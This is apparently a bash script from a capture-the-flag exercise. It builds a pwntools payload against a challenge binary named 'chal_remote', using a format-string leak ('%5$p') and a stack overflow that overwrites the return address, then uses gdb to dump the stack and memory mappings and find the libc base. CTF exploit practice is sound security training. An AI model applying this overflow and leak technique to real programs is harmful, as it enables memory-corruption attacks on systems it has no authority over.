#!/bin/bash
cd /work/waf/waf
python3 - <<'PY'
from pwn import *
p=b"exit"+b"%5$p"
p=p.ljust(88,b"A")+p64(0x4010d4)
open("/tmp/pl.bin","wb").write(p)
PY
cat > /tmp/gs <<'EOF'
set pagination off
# break at main ret (about to printf via our overwrite)
break *0x401373
run < /tmp/pl.bin
# dump 20 qwords at rsp (these are printf's stack varargs source)
printf "=== rsp dump (printf varargs) ===\n"
x/24gx $rsp
printf "=== libc base ===\n"
info proc mappings
EOF
gdb -q -batch -x /tmp/gs ./chal_remote > /tmp/g.txt 2>&1
grep -vE "pwndbg|Detected|Updating|loaded|created|terminfo|Terminal|Consider|warning|Thread|Using|Reading" /tmp/g.txt | grep -E "0x7f|libc|ld\.so|0x4012|rsp|===|stack" | head -50
